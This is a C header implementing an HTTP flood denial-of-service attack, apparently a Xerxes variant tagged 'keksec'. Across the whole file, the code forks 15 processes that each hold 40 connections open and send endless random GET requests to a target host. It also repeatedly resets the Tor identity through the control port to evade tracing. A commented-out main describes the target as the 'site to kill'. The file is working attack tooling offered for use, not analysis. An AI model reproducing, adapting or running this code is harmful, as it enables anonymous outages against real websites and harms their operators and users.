/*
This program is licensed under the GNU General Public License v3.
Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
See https://www.gnu.org/licenses/gpl-3.0.html for details.
*/
#ifndef HTTPDOS_H
#define HTTPDOS_H
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h> // Added for time function
#include <pthread.h> // Added for pthread library
#include "datatype.h"

int _attacks = 0;
int sizebuf; // initialize for tcp payload size
int sizebuf2;

/*
 * This function just abstracts sockets to an easier way of calling them.
 */

int _tcp_make_socket(char *host, char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        exit(0);
    }

    for(p = servinfo; p != NULL; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
            close(sock);
            continue;
        }
        break;
    }
    if(p == NULL) {
        if(servinfo)
            freeaddrinfo(servinfo);
        fprintf(stderr, "No connection could be made to %s:%s\n", host, port);
        exit(0);
    }

    if(servinfo)
        freeaddrinfo(servinfo);
    return sock;
}

void _tcp_broke(int s) {
    // do nothing
}

#define CONNECTIONS 40
#define THREADS 15

char string[256]; // Increased size for string array

static char * createStr() {
    int string_length = rand() % 20 + 1;
    int i = 0;
    for( i = 0; i < string_length; ++i){
        string[i] = '0' + rand()%72; // starting on '0', ending on '}'
    }
    return string;
}

void http_attack(char *host, char *port, int id) {
    int sockets[CONNECTIONS];
    int x, g=1, r;
    for(x=0; x!= CONNECTIONS; x++)
        sockets[x]=0;
    signal(SIGPIPE, &_tcp_broke);
    printf("NOTICE %s :HTTP-Xerexing %s.\n", host, port); // Fixed printf statement
    while(1) {
        for(x=0; x != CONNECTIONS; x++) {
            if(sockets[x] == 0)
                sockets[x] = _tcp_make_socket(host, port);

            char *string = createStr();
            char httpbuf[1024];
            sprintf(httpbuf,"GET /%s HTTP/1.0\r\nUser-Agent: Wget/1.16 (linux-gnu/keksec)\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n",string);
            char s_copy[128];
            strncpy(s_copy, httpbuf, sizeof(s_copy));
            int sizebuf = sizeof s_copy - 1;
            r=write(sockets[x], s_copy, sizebuf);
            if(r == -1) {
                close(sockets[x]); 
                sockets[x] = _tcp_make_socket(host, port);
            }
            _attacks++;
            fprintf(stderr, "[%i:\tvolley sent, %d\t]\n", id, _attacks);
        }
        usleep(300000);
    }
}

void _tcp_cycle_identity() {
    int r;
    int socket = _tcp_make_socket("localhost", "9050");
    write(socket, "AUTHENTICATE \"\"\n", 16);
    while(1) {
        r=write(socket, "signal NEWNYM\n\x00", 16);
        fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
        usleep(300000);
    }
}

int runHttpDos(char *host, char *port) {
    int x;
    for(x=0; x != THREADS; x++) {
        if(fork())
            http_attack(host, port, x);
        usleep(200000);
    }
    getc(stdin);
    return 0;
}


// int main(int argc, char **argv) {
//     srand(time(NULL));
//     int x;
//     if(argc !=3) {
//         printf("xerxeshttp Usage Summary:\n%s [site to kill] [port, 80 is best]\nThis version uses http get requests instead of nulls.\nYour tor identity has been reset\n\n", argv[0]);
//         _tcp_cycle_identity();
//         return 0;
//     }
//     for(x=0; x != THREADS; x++) {
//         if(fork())
//             http_attack(argv[1], argv[2], x);
//         usleep(200000);
//     }
//     getc(stdin);
//     return 0;
// }



#endif // HTTPDOS_H